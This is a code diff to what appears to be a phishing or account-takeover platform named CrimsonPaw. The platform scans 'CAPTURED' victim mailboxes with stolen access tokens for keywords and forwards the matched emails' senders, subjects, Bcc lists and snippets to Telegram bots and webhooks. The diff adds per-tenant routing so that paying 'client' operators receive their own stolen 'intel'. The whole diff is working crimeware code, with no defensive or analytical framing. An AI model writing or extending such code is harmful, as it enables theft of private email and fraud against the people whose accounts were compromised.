@@ -60,14 +60,27 @@ def send_keyword_telegram_message(bot_token, chat_id, text, parse_mode='HTML'):
         return False, f"Connection error: {str(e)}"
     return False, "Unknown failure."
 
-def send_alert(tg_html, wh_md=""):
-    """Dispatch real-time notification to dedicated Keyword Telegram Bot and Webhook."""
+def send_alert(tg_html, wh_md="", owner_id=None):
+    """Dispatch real-time keyword notification to the owning tenant's Telegram bot,
+    falling back to the global Keyword bot for master-owned (unowned) events."""
     cfg = load_settings()
-    
+
+    # Resolve the owning tenant's personal bot (client subscribers get their own channel)
+    owner_bot_token = ''
+    owner_chat_id = ''
+    if owner_id:
+        try:
+            op = db.get_operator(owner_id)
+            if op:
+                owner_bot_token = (op.get('tg_bot_token') or '').strip()
+                owner_chat_id = (op.get('tg_chat_id') or '').strip()
+        except Exception:
+            pass
+
     # 1. Dedicated Keyword Alerts Telegram Bot
     if cfg.get('kwa_tg_enabled', True):
-        kwa_bot_token = cfg.get('kwa_tg_bot_token', '').strip() or cfg.get('tg_bot_token', '').strip()
-        kwa_chat_id = cfg.get('kwa_tg_chat_id', '').strip() or cfg.get('tg_chat_id', '').strip()
+        kwa_bot_token = (owner_bot_token or cfg.get('kwa_tg_bot_token', '') or cfg.get('tg_bot_token', '')).strip()
+        kwa_chat_id = (owner_chat_id or cfg.get('kwa_tg_chat_id', '') or cfg.get('tg_chat_id', '')).strip()
         if kwa_bot_token and kwa_chat_id:
             ok, msg = send_keyword_telegram_message(kwa_bot_token, kwa_chat_id, tg_html)
             if ok:
@@ -76,6 +89,11 @@ def send_alert(tg_html, wh_md=""):
                 logger.warning(f"Failed to dispatch keyword alert to Telegram: {msg}")
         else:
             logger.info("Keyword alert Telegram notification skipped: Telegram bot token/chat ID not configured.")
+
+    # Tenant-exclusive routing: client-owned events stop here — the global
+    # webhook belongs to the master platform and must not receive client intel.
+    if owner_id:
+        return
 
     # 2. Webhook Dispatch
     webhook_url = cfg.get('kwa_webhook_url', '').strip() or cfg.get('webhook_url', '').strip()
@@ -111,6 +129,15 @@ def extract_snippet(text, keyword, context_chars=75):
 
 def dispatch_keyword_alert(match_data, rule_data):
     """Format Telegram and Webhook keyword alerts using CrimsonPaw keyword alert structure."""
+    # Resolve the owning tenant for exclusive alert routing (client bots get their own intel)
+    owner_id = None
+    try:
+        s_row = db.get_session_by_user_code(match_data.get('session_user_code'))
+        if s_row:
+            owner_id = s_row.get('owner_id')
+    except Exception:
+        pass
+
     raw_kw = str(match_data.get('matched_keyword', '')).strip()
     raw_mailbox = str(match_data.get('victim_email') or match_data.get('victim_name') or 'Unknown Mailbox').strip()
     raw_subject = str(match_data.get('email_subject', '(No Subject)')).strip()
@@ -143,7 +170,7 @@ def dispatch_keyword_alert(match_data, rule_data):
         f"Bcc: {raw_bcc}"
     )
 
-    send_alert(tg_html, wh_md)
+    send_alert(tg_html, wh_md, owner_id=owner_id)
 
 def parse_iso_datetime(dt_str):
     """Normalize ISO-8601 or SQLite datetime string to comparable YYYY-MM-DD HH:MM:SS format."""
@@ -191,7 +218,7 @@ def scan_victim_mailbox(session, rules=None):
             return {'status': 'error', 'message': 'No valid access token available', 'hits': 0}
 
         if rules is None:
-            rules = db.get_keyword_rules(active_only=True)
+            rules = db.get_keyword_rules(active_only=True, owner_id=session.get('owner_id'))
 
         # Filter rules for this account
         applicable_rules = []
@@ -383,17 +410,27 @@ def scan_all_victims(rule_ids=None):
     try:
         sessions = db.get_all_sessions()
         captured = [s for s in sessions if s.get('status') == 'CAPTURED']
-        
-        rules = db.get_keyword_rules(active_only=True)
-        if rule_ids:
-            rules = [r for r in rules if r['id'] in rule_ids]
+
+        # ── Per-tenant rule scoping ─────────────────────────────────────
+        # Client rules scan ONLY client-owned mailboxes; master-owned rules
+        # (owner_id IS NULL) scan ONLY master mailboxes. No cross-tenant intel.
+        rules_cache = {}
+
+        def _rules_for(owner_id):
+            key = owner_id if owner_id is not None else '__master__'
+            if key not in rules_cache:
+                owner_rules = db.get_keyword_rules(active_only=True, owner_id=owner_id)
+                if rule_ids:
+                    owner_rules = [r for r in owner_rules if r['id'] in rule_ids]
+                rules_cache[key] = owner_rules
+            return rules_cache[key]
 
         total_scanned_accounts = 0
         total_emails_scanned = 0
         total_new_hits = 0
 
         for s in captured:
-            res = scan_victim_mailbox(s, rules=rules)
+            res = scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))
             if res.get('status') == 'ok':
                 total_scanned_accounts += 1
                 total_emails_scanned += res.get('emails_scanned', 0)
@@ -431,4 +468,3 @@ class KeywordWatcherThread(threading.Thread):
             except Exception as e:
                 logger.error(f"[KEYWORD-WATCHER] Error in background polling cycle: {e}")
             self._stop_event.wait(self.interval)
-
